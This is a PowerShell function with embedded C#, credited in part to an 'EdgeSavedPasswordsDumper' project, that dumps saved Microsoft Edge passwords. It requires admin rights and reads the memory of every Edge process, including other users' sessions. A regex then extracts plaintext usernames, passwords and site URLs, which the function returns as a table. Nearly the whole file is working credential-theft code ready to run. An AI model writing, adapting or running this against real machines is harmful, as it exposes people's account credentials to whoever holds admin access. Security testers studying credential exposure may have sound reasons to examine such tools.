function Get-EdgePasswords {
    <#
    .SYNOPSIS
      Returns information about Edge passwords.
  
    .DESCRIPTION
      Get-EdgePasswords returns saved Edge passwords.
  
    .EXAMPLE
      Get-EdgePasswords | format-table -AutoSize -Wrap

    .OUTPUTS
      PSCustomObject
  
    .NOTES
      Author:  Nikolay Unguzov, used code from https://github.com/L1v1ng0ffTh3L4N/EdgeSavedPasswordsDumper/tree/main
      Website: https://procomp-bg.com
    #>

# Check if running elevated (admin)
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [System.Security.Principal.WindowsPrincipal]::new($identity)
$isElevated = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isElevated) {
    Write-Host "[x]" -ForegroundColor Red -NoNewline
    Write-Host " Not running elevated"
    exit 1
}

Write-Host "Fetching browser processes..." -NoNewline -ForegroundColor Cyan

$seenCredentials = [System.Collections.Generic.HashSet[string]]::new()
$alreadyCheckedUsers = [System.Collections.Generic.HashSet[string]]::new()

# Remove existing type if it exists
if ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetTypes() | Where-Object { $_.Name -eq 'MemoryScanner' } }) {
    Write-Verbose "MemoryScanner type already exists - will be redefined"
}

$csharpCode = @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

public class MemoryScannerV2
{
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    public static string GetProcessOwnerFromToken(int processId)
    {
        IntPtr hProcess = OpenProcess(0x1000, false, processId);
        if (hProcess == IntPtr.Zero)
            return "UNKNOWN";

        IntPtr hToken = IntPtr.Zero;
        if (!OpenProcessToken(hProcess, 8, out hToken))
            return "UNKNOWN";

        try
        {
            WindowsIdentity wi = new WindowsIdentity(hToken);
            return wi.Name ?? "UNKNOWN";
        }
        catch
        {
            return "UNKNOWN";
        }
        finally
        {
            CloseHandle(hToken);
            CloseHandle(hProcess);
        }
    }

    public static List<Dictionary<string, string>> ScanProcessMemory(int processId)
    {
        List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
        
        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processId);
        if (processHandle == IntPtr.Zero)
        {
            return results;
        }

        IntPtr address = IntPtr.Zero;
        MEMORY_BASIC_INFORMATION memInfo;

        while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
        {
            bool readable = memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE;

            if (readable)
            {
                byte[] buffer = new byte[(int)memInfo.RegionSize];
                IntPtr bytesRead;

                if (ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, buffer.Length, out bytesRead))
                {
                    string utf8 = Encoding.UTF8.GetString(buffer);
                    string[] lines = System.Text.RegularExpressions.Regex.Split(utf8, @"\r\n|\r|\n");

                    foreach (var line in lines)
                    {
                        string pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{3,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{6,40})\x20\x00";

                        System.Text.RegularExpressions.MatchCollection matches = System.Text.RegularExpressions.Regex.Matches(line, pattern);

                        foreach (System.Text.RegularExpressions.Match match in matches)
                        {
                            string username = match.Groups[1].Value;
                            string password = match.Groups[2].Value;

                            string urlPattern = @"\x00\x00\x00([A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+)(https?)\x20" + 
                                System.Text.RegularExpressions.Regex.Escape(username) + " " + 
                                System.Text.RegularExpressions.Regex.Escape(password);

                            foreach (System.Text.RegularExpressions.Match urlMatch in System.Text.RegularExpressions.Regex.Matches(line, urlPattern))
                            {
                                string url = urlMatch.Groups[1].Value;
                                
                                var result = new Dictionary<string, string>();
                                result["Username"] = username;
                                result["Password"] = password;
                                result["Site"] = url;
                                results.Add(result);
                            }
                        }
                    }
                }
            }

            address = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
        }

        CloseHandle(processHandle);
        return results;
    }
}
"@

# Add the type with a new name to avoid conflicts
try {
    Add-Type -TypeDefinition $csharpCode -Language CSharp -ErrorAction Stop
} catch {
    if ($_.Exception.Message -notlike "*already exists*") {
        throw
    }
}

# Get browser processes
$processList = @()
$searcher = Get-CimInstance -Query "SELECT ProcessId, Name, ParentProcessId FROM Win32_Process WHERE Name='msedge.exe'"

foreach ($process in $searcher) {
    $currentPid = $process.ProcessId
    $parentPid = $process.ParentProcessId

    $skip = $false

    # Check if parent is also msedge.exe
    try {
        $parent = Get-Process -Id $parentPid -ErrorAction Stop
        if ($parent.ProcessName -eq "msedge") {
            $skip = $true
        }
    }
    catch {
        # Parent may have exited - treat as root process
    }

    if (-not $skip) {
        $owner = [MemoryScannerV2]::GetProcessOwnerFromToken($currentPid)
        $processList += [PSCustomObject]@{
            Id = $currentPid
            Name = $process.Name
            Owner = $owner
        }
    }
}

Write-Host " Done." -ForegroundColor Cyan

# Collect all results
$allResults = @()

# Scan each process
foreach ($proc in $processList) {
    $checkKey = "$($proc.Owner) $($proc.Name)"
    
    if (-not $alreadyCheckedUsers.Contains($checkKey)) {
        $owner = $proc.Owner -replace "NSC\\t1_", ""
        Write-Host "Scanning process PID: $($proc.Id), Name: $($proc.Name), Owner: $owner..." -NoNewline -ForegroundColor Cyan

        $results = [MemoryScannerV2]::ScanProcessMemory($proc.Id)
        
        foreach ($result in $results) {
            $combined = "$($result['Username']) : $($result['Password']) @$($result['Site'])"
            
            if (-not $seenCredentials.Contains($combined)) {
                [void]$seenCredentials.Add($combined)
                
                $allResults += [PSCustomObject]@{
                    Username = $result['Username']
                    Password = $result['Password']
                    Site     = $result['Site']
                    ProcessOwner = $owner
                    ProcessId    = $proc.Id
                }
            }
        }
        
        [void]$alreadyCheckedUsers.Add($checkKey)
        Write-Host " Done." -ForegroundColor Cyan
    }
}

return $allResults

# Cleanup hashset
$seenCredentials.Clear()
$seenCredentials = $null
$allResults.clear()
$allResults = $null

}